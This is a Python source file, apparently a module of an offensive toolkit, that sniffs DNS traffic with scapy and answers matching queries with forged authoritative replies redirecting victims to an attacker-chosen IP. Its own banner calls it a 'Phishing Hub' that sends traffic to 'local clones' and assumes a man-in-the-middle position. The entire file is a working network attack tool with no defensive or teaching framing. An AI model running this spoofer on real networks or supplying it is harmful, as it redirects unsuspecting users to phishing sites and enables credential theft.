import re
import os
import socket
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send, sniff
from rich.console import Console
from rich.table import Table
from core.ui import show_briefing

console = Console()
SPOOF_MAP = {}


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def dns_callback(packet):
    if packet.haslayer(DNSQR):
        qname = packet[DNSQR].qname.decode().strip('.')
        for pattern, redirect_ip in SPOOF_MAP.items():
            if re.search(pattern, qname, re.IGNORECASE):
                spoofed_pkt = (
                    IP(dst=packet[IP].src, src=packet[IP].dst) /
                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                    DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=redirect_ip))
                )
                send(spoofed_pkt, verbose=False, count=1)
                console.print(
                    f"[bold red][!] HIJACK:[/bold red] {qname} -> {redirect_ip}")


def start_dns_spoof():
    if os.getuid() != 0:
        return console.print("[red][!] Root required.[/red]")

    show_briefing("DNS Spoofer: Phishing Hub",
                  "Redirects traffic to local clones.", ["MITM Required"])
    local_ip = get_local_ip()
    console.print(f"[dim grey]Local IP for redirection: {local_ip}[/dim grey]")

    while True:
        pattern = console.input(
            "[bold cyan]Target Domain (regex) or 'done': [/bold cyan]").strip()
        if pattern.lower() == 'done':
            break
        ip = console.input(f"Redirect to [Default {local_ip}]: ") or local_ip
        SPOOF_MAP[pattern] = ip

    if SPOOF_MAP:
        table = Table(title="Active DNS Spoof Rules", border_style="cyan")
        table.add_column("Pattern", style="magenta")
        table.add_column("Redirect Target", style="green")
        for p, r in SPOOF_MAP.items():
            table.add_row(p, r)
        console.print(table)

        console.print("[*] Monitoring DNS traffic...")
        try:
            sniff(filter="udp port 53", prn=dns_callback, store=0)
        except KeyboardInterrupt:
            console.print("\n[yellow][-] Stopping Spoofer.[/yellow]")
